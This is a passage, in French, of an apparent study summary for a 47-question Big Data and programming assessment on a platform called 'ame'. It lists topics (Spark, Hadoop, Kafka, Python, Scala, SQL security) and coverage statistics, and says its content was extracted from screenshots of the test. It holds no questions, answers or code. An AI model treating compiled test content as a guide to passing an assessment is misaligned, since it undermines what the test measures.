**Questions moyennes (1-5 min):**
- Majorité des QCM Spark, SQL, Hadoop, Kafka (28 questions)

**Questions avancées (5-20 min):**
- Q16 (checksums), Q26/Q37 (portails), Q30/Q31 (SQL queries) (9 questions)

### Sujets techniques couverts

#### Big Data Ecosystem (27 questions - 61%)
**Apache Spark:**
- RDDs et transformations lazy
- Actions vs Transformations
- Serialization (Java vs Kryo)
- Performance (ReduceByKey vs GroupByKey)
- Case classes et pattern matching

**Hadoop:**
- Architecture HDFS (NameNode, DataNode)
- High Availability (Active/Standby)
- Heartbeat et tolérance aux pannes
- Oozie workflows

**Kafka:**
- Architecture (Broker, Topics, Partitions)
- Producer/Consumer patterns
- Kafka Streams et Kafka Connect
- Schema Registry et sérialization
- Sécurité (SSL, SASL)
- Quotas et performance tuning

#### Programming (11 questions - 25%)
**Python 3:**
- File processing et checksums
- Date manipulation
- Design patterns (Factory)
- List comprehensions

**Scala:**
- Pattern matching et case classes
- Immutabilité
- Collections (List vs ListBuffer)
- Type hierarchy
- Implicits
- Algorithmes sur grilles 2D

#### Databases & SQL (6 questions - 14%)
- Requêtes d'agrégation (GROUP BY, HAVING)
- JOINs et DISTINCT
- Sécurité (XSS, injection SQL, commandes shell)
- ACID properties

---

## Notes techniques finales

### Plateforme
- **Évaluation complète:** 47 questions au total
- **Questions capturées:** 39 questions
- **Questions manquantes:** Q1, Q2, Q3, Q12, Q15, Q17, Q19, Q20 (8 questions)
- **Taux de couverture:** 83% (39/47)
- **Plateforme:** ame
- **Format:** Français
- **Niveau:** Intermédiaire à Avancé

### Focus principal
**Big Data & Distributed Systems:** 61% des questions
- Emphasis sur Kafka (23% du total)
- Architecture et performance
- Streaming et real-time processing

### Compétences évaluées
1. **Architecture distribuée** : Hadoop, Spark, Kafka
2. **Programming** : Python, Scala
3. **Data processing** : ETL, streaming, batch
4. **Databases** : SQL, sécurité
5. **Performance tuning** : Serialization, réplication, partitioning
6. **Security** : Authentication, encryption, XSS

### Préparation recommandée
- Apache Kafka documentation officielle
- Scala functional programming
- Spark RDD operations et optimizations
- Hadoop HDFS architecture
- SQL performance et sécurité
- Design patterns

---

## Fin du document

**Date de création:** Décembre 2024  
**Version:** 1.0 - Complète  
**Auteur:** Extraction depuis captures d'écran ame  
**Questions capturées:** 39/47 (83% de couverture)  
**Questions manquantes:** Q1, Q2, Q3, Q12, Q15, Q17, Q19, Q20